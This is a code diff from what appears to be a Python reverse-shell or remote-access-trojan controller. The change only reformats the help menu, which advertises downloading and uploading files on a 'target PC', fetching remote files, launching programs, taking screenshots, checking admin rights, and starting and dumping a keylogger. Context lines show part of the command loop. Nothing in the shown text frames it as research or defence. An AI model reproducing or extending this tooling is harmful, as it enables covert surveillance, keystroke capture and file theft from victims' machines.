@@ -73,15 +73,15 @@ def shell():
 			break
 		elif command == "help":
 			print("command help")
-			help_options = '''					download path --> Download a file from target PC
-					upload path   --> Upload a file to target PC
-					get url       --> Download a file to target PC from a url
-					start path    --> Start a program on target pc
-					screenshot    --> Take a screenshot of target monitor
-					check         --> Check for the admin privileges
-					keylog_start  --> Start the keylogger on target PC
-					keylog_dump   --> Dump the keylogger collected data
-					q             --> exit the reverse shell '''
+			help_options = '''					download <path> --> Download a file from target PC
+					upload <path>   --> Upload a file to target PC
+					get <url>       --> Download a file to target PC from a url
+					start <path>    --> Start a program on target pc
+					screenshot    	--> Take a screenshot of target monitor
+					check         	--> Check for the admin privileges
+					keylog_start  	--> Start the keylogger on target PC
+					keylog_dump   	--> Dump the keylogger collected data
+					q             	--> exit the reverse shell '''
 			reliable_send(help_options)
 		elif command[:2] == "cd" and len(command) > 1: #si commande commence par cd et il y a plus de 1 arg
 			try:
